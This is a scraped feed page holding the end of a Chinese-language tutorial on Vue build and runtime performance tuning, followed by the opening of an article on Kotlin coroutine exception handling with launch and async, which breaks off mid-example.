<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vue.config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">chainWebpack</span>: <span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> {
    config.<span class="hljs-property">optimization</span>.<span class="hljs-title function_">minimizer</span>(<span class="hljs-string">'terser'</span>).<span class="hljs-title function_">tap</span>(<span class="hljs-function"><span class="hljs-params">args</span> =&gt;</span> {
      args[<span class="hljs-number">0</span>].<span class="hljs-property">terserOptions</span>.<span class="hljs-property">compress</span>.<span class="hljs-property">drop_console</span> = <span class="hljs-literal">true</span>
      <span class="hljs-keyword">return</span> args
    })
  }
}
</code></pre>
<h4 data-id="heading-5">b. Babel按需polyfill</h4>
<p>避免全量引入@babel/polyfill：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// babel.config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">presets</span>: [
    [
      <span class="hljs-string">'@vue/cli-plugin-babel/preset'</span>,
      {
        <span class="hljs-attr">useBuiltIns</span>: <span class="hljs-string">'usage'</span>, <span class="hljs-comment">// 关键配置</span>
        <span class="hljs-attr">corejs</span>: <span class="hljs-number">3</span>
      }
    ]
  ]
}
</code></pre>
<h4 data-id="heading-6">c. SplitChunks优化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vue.config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">configureWebpack</span>: {
    <span class="hljs-attr">optimization</span>: {
      <span class="hljs-attr">splitChunks</span>: {
        <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span>,
        <span class="hljs-attr">maxSize</span>: <span class="hljs-number">244</span> * <span class="hljs-number">1024</span>, <span class="hljs-comment">// 拆分为~244KB的块</span>
        <span class="hljs-attr">cacheGroups</span>: {
          <span class="hljs-attr">vendors</span>: {
            <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>,
            <span class="hljs-attr">priority</span>: -<span class="hljs-number">10</span>
          },
          <span class="hljs-attr">default</span>: {
            <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>,
            <span class="hljs-attr">priority</span>: -<span class="hljs-number">20</span>,
            <span class="hljs-attr">reuseExistingChunk</span>: <span class="hljs-literal">true</span>
          }
        }
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-7">2. Vue运行时优化：减少响应式开销</h3>
<h4 data-id="heading-8">a. Object.freeze冻结大型静态数据</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> { 
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> { 
      <span class="hljs-attr">largeList</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(hugeArray) <span class="hljs-comment">// Vue将不会为其添加响应式特性</span>
    } 
  } 
}
</code></pre>
<h4 data-id="heading-9">b. v-once用于静态内容缓存</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-once</span>&gt;</span>{{ staticContent }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<h4 data-id="heading-10">c. computed属性缓存妙用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">computed</span>: { 
 <span class="hljs-comment">// Good:</span>
 <span class="hljs-title function_">optimizedData</span>(<span class="hljs-params"/>) { 
   <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">heavyCalculation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">input</span>)
 },
  
 <span class="hljs-comment">// Better (当依赖项不变时):</span>
 <span class="hljs-title function_">memoizedData</span>(<span class="hljs-params"/>) { 
   <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">input</span>)
   <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_cache</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">_cache</span>.<span class="hljs-property">key</span> !== cacheKey) { 
     <span class="hljs-variable language_">this</span>.<span class="hljs-property">_cache</span> = { 
       <span class="hljs-attr">key</span>: cacheKey,
       <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">heavyCalculation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">input</span>)
     } 
   } 
   <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_cache</span>.<span class="hljs-property">value</span> 
 } 
}
</code></pre>
<h3 data-id="heading-11">3. Smart Lazy Loading：超越路由级别的懒加载</h3>
<h4 data-id="heading-12">a. Intersection Observer实现的组件懒加载</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// lazy-component.js  </span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">LazyComponent</span> = (<span class="hljs-params"/>) =&gt; ({
 <span class="hljs-attr">component</span>: <span class="hljs-keyword">import</span>(<span class="hljs-string">'./ExpensiveComponent.vue'</span>),
 <span class="hljs-attr">loading</span>: <span class="hljs-title class_">LoadingComponent</span>,
 <span class="hljs-attr">error</span>: <span class="hljs-title class_">ErrorComponent</span>,
 <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>, <span class="hljs-comment">// ms延迟显示loading组件</span>
 
})

<span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">'LazyComponent'</span>, <span class="hljs-title class_">LazyComponent</span>)
</code></pre>
<h4 data-id="heading-13">b. prefetch策略控制（适用于vue-router）</h4>
<pre><code class="hljs language-javascript" lang="javascript">{
 <span class="hljs-attr">path</span>:<span class="hljs-string">'/dashboard'</span>,
 <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetchPriority:.5 */</span> <span class="hljs-string">'./views/Dashboard.vue'</span>)
}
</code></pre>
<h4 data-id="heading-14">c. webpack魔法注释控制预加载行为：</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Foo</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(
 <span class="hljs-comment">/* webpackPreloadPriority:.8 */</span>
 <span class="hljs-comment">/* webpackChunkName:"group-foo" */</span>
 <span class="hljs-string">'./Foo.vue'</span>
)
</code></pre>
<h3 data-id="heading-15">4. Vuex状态管理精细控制</h3>
<h4 data-id="heading-16">a. getter函数去重计算：</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">getters</span>:{
 <span class="hljs-title function_">activeUsers</span>(<span class="hljs-params">state</span>){  
   <span class="hljs-keyword">return</span> state.<span class="hljs-property">users</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">u</span> =&gt;</span> u.<span class="hljs-property">isActive</span>)   
   <span class="hljs-comment">// Bad：每次访问都会重新计算</span>
    
   <span class="hljs-comment">// Good：使用reselect-like记忆化技术  </span>
   <span class="hljs-keyword">let</span> lastState, lastResult  
   <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> {  
     <span class="hljs-keyword">if</span>(lastState === state.<span class="hljs-property">users</span> &amp;&amp; state.<span class="hljs-property">showActive</span>){  
       <span class="hljs-keyword">return</span> lastResult  
     }  
     lastState = state.<span class="hljs-property">users</span>  
     lastResult = state.<span class="hljs-property">users</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">u</span> =&gt;</span> u.<span class="hljs-property">isActive</span>)  
     <span class="hljs-keyword">return</span> lastResult  
   }   
 }
}
</code></pre>
<h4 data-id="heading-17">b. Action批处理模式：</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">actions</span>:{
 <span class="hljs-keyword">async</span> <span class="hljs-title function_">batchUpdate</span>(<span class="hljs-params">{ commit }, payloads</span>){
   <span class="hljs-keyword">const</span> batchedMutations = payloads.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">batch, payload</span>) =&gt;</span> {
     batch.<span class="hljs-title function_">push</span>([<span class="hljs-string">'UPDATE_ITEM'</span>, payload])
     <span class="hljs-keyword">return</span> batch;
   }, []);
   
   <span class="hljs-title function_">commit</span>(<span class="hljs-string">'BATCH_MUTATION'</span>, batchedMutations);
   
   <span class="hljs-comment">// VS传统的多次commit方式：</span>
   <span class="hljs-comment">// payloads.forEach(payload=&gt;commit('UPDATE_ITEM',payload))</span>
 }
}  
  
<span class="hljs-attr">mutations</span>:{
 <span class="hljs-title function_">BATCH_MUTATION</span>(<span class="hljs-params">state, mutations</span>){
   mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[type,payload]</span>) =&gt;</span>{...})
 }
}
</code></pre>
<h3 data-id="heading-18">5. DOM渲染层深度优化</h3>
<h4 data-id="heading-19">a. Virtual Scrolling关键技术点：</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">RecycleScroller</span>	
 <span class="hljs-attr">class</span>=<span class="hljs-string">"scroller"</span>	
 <span class="hljs-attr">:items</span>=<span class="hljs-string">"largeList"</span>	
 <span class="hljs-attr">:item-size</span>=<span class="hljs-string">"56"</span>	
 <span class="hljs-attr">key-field</span>=<span class="hljs-string">"id"</span>	
 <span class="hljs-attr">v-slot</span>=<span class="hljs-string">"{ item }"</span>&gt;</span>	
 <span class="hljs-tag">&lt;<span class="hljs-name">ListItem</span> <span class="hljs-attr">:item</span>=<span class="hljs-string">"item"</span>/&gt;</span>	
<span class="hljs-tag">&lt;/<span class="hljs-name">RecycleScroller</span>&gt;</span>
</code></pre>
<p>替代传统v-for方案可减少90%+的DOM节点。</p>
<h4 data-id="heading-20">b. CSS Containment属性配合：</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.list-item</span>{
 <span class="hljs-attribute">contain</span>:layout paint style; <span class="hljs-comment">/* Chrome/Safari */</span>
 <span class="hljs-attribute">content-visibility</span>:hidden; <span class="hljs-comment">/* Firefox */</span>
}	
	
<span class="hljs-selector-class">.list-item-visible</span>{	
 <span class="hljs-attribute">content-visibility</span>:hidden;	<span class="hljs-attribute">contain</span>:none;
}	
</code></pre>
<p>可使浏览器跳过不可见元素的布局和绘制。</p>
<h2 data-id="heading-21">总结</h2>
<p>本文介绍的五个维度优化策略涵盖了从构建工具配置到运行时优化的完整链条。值得注意的是，真正的性能提升往往来自于对应用特性的深刻理解而非盲目套用方案。建议开发者首先使用Vue DevTools和Lighthouse进行基准测试，识别瓶颈后再针对性应用上述技巧。记住，"过早的优化是万恶之源"，但当应用确实需要性能提升时，这些被大多数开发者忽略的技术可能会带来意想不到的效果。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 协程异常的黄金准则]]></title>    <link>https://juejin.cn/post/7597326073671974927</link>    <guid>https://juejin.cn/post/7597326073671974927</guid>    <pubDate>2026-01-21T00:26:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671974927" data-draft-id="7594657393830707238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 协程异常的黄金准则"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-01-21T00:26:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 协程异常的黄金准则
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:26:05.000Z" title="Wed Jan 21 2026 00:26:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"☂"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"✓"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"➤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0ca5b7edf22418d94601a1398bba020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559965&amp;x-signature=LziwAwIiP2DImyzd71500K28jNs%3D" alt="0.jpg" loading="lazy"/></p>
<p>之前我写过一篇文章 <a href="https://juejin.cn/post/7497895954102468648" target="_blank" title="https://juejin.cn/post/7497895954102468648">Kotlin协程异常一文通</a>，那篇文章直接从异常的函数入手，讲述了 Kotlin 协程的特点和部分用法。</p>
<p>我把那篇文章分享给了同事，过了一段时间，他还是来问我：<code>coroutineScope</code> 处理异常有什么特点？</p>
<p>虽然那篇文章我认为写的非常明确，但是我想他既然记不住，可能太教科书了。我告诉他，你等我下篇文章，我给你讲个明明白白。</p>
<p>于是，我打算从案例入手，来几条黄金准则，一篇文章搞懂在 Kotlin 协程中如何处理异常。</p>
<p>协程异常处理的核心机制是<strong>结构化并发</strong>。</p>
<p>这是 Kotlin 协程的设计原则，也是为什么协程异常有点难处理的原因。</p>
<p>你可以把它想象成一棵任务树：只要某个子协程因异常失败，就会立即通知父协程；父协程会马上取消所有其他子协程，随后自身也被取消，并将异常继续向上传播。</p>
<p>这种机制能确保不会有任何“孤儿协程”被遗漏，让协程的生命周期始终处于可控状态。</p>
<p>下面我们结合实际开发场景，拆解协程异常处理的核心逻辑和正确姿势。</p>
<h2 data-id="heading-0">场景一：使用 launch</h2>
<p><code>launch</code> 是典型的 “fire-and-forget（发起即忘）”型协程构建器，适合不需要返回结果的任务。但它的异常处理逻辑很容易踩坑，新手常在这里栽跟头。</p>
<h3 data-id="heading-1">错误做法：在 launch 外层套 try-catch</h3>
<p>这是高频错误用法：把 <code>launch</code> 调用包裹在 <code>try-catch</code> 里，这样做<strong>根本无法捕获协程内部抛出的异常</strong>。</p>
<h3 data-id="heading-2">问题原因</h3>
<p><code>launch</code> 会立即返回，而协程体里的代码是在后台线程异步执行的。等异常真正抛出时，外层的 <code>try-catch</code> 早就执行完了。最终异常会一路冒泡到顶层异常处理器，若无人处理，应用就会直接崩溃。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before launch"</span>)
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 这个 launch 块会抛出异常</span>
        launch {
            println(<span class="hljs-string">"Inside launch: Throwing exception..."</span>)
            delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// 模拟耗时操作</span>
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Something went wrong!"</span>)
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// ❌ 这段代码永远不会执行 ❌</span>
        println(<span class="hljs-string">"Caught exception: <span class="hljs-variable">$e</span>"</span>)
    }
    println(<span class="hljs-string">"After launch"</span>)
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 保持主线程存活，观察崩溃现象</span>
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-php" lang="php">Before launch
After launch
Inside launch: Throwing exception...
<span class="hljs-built_in">Exception</span> in thread <span class="hljs-string">"main"</span> java.lang.<span class="hljs-built_in">RuntimeException</span>: Something went wrong!
...
</code></pre>
<p>可以看到，“Caught exception” 从未打印，程序直接崩溃。</p>
<h3 data-id="heading-3">正确做法：在 launch 内部使用 try-catch</h3>
<p>要处理某个 <code>launch</code> 协程的异常，必须把 <code>try-catch</code> 直接放在协程的 <strong>lambda</strong> 表达式内部。</p>
<p><em>这个做法简直是异常处理的古法捕获！</em></p>
<p>这样能让异常处理逻辑紧跟异常发生的位置——也就是协程自身的执行路径上。只有这样，才能优雅处理错误，避免整个作用域崩溃。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before launch"</span>)
    launch {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 风险代码放在 try 块中</span>
            println(<span class="hljs-string">"Inside launch: Doing some work..."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Oops, failed!"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            <span class="hljs-comment">// ✅ 正确捕获异常</span>
            println(<span class="hljs-string">"Caught exception inside launch: <span class="hljs-subst">${e.message}</span>"</span>)
        }
    }
    println(<span class="hljs-string">"After launch"</span>)
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 等待 launch 执行完成</span>
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Before launch
After launch
Inside launch: Doing some work...
Caught exception inside launch: Oops, failed!
Main finished
</code></pre>
<p>此时程序能正常处理异常，不会崩溃。</p>
<h2 data-id="heading-4">场景二：使用 async 构建器</h2>
<p>当需要执行任务并后续获取结果时，用 <code>async</code> 构建器，它会返回一个 <code>Deferred</code> 对象。<code>async</code> 的异常处理逻辑和 <code>launch</code> 不同——它会“暂存”异常，直到你调用 <code>await()</code> 获取结果时才会抛出。</p>
<h3 data-id="heading-5">错误做法：在 async 调用周围套 try-catch</h3>
<p>仅把 <code>async</code> 本身包裹在 <code>try-catch</code> 里是无效的。</p>
<h3 data-id="heading-6">问题原因</h3>
<p><code>async</code> 会立即返回 <code>Deferred</code> 对象，协程内部的异常会被存储在这个对象中，等待你显式调用 <code>await()</code> 时才会暴露。因此，在 <code>async</code> 外层 <code>try-catch</code> 根本捕获不到这个延迟出现的异常。</p>
<h3 data-id="heading-7">正确做法：在 await() 调用周围用 try-catch</h3>
<p>只有调用 <code>await()</code> 获取结果时，<code>async</code> 内部的异常才会被重新抛出——这是异常真正“显现”的时刻。</p>
<p>这种设计让你可以自主决定处理失败的时机和方式。异常是“延迟结果”的一部分，只有主动请求结果时才会触发异常。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before async"</span>)
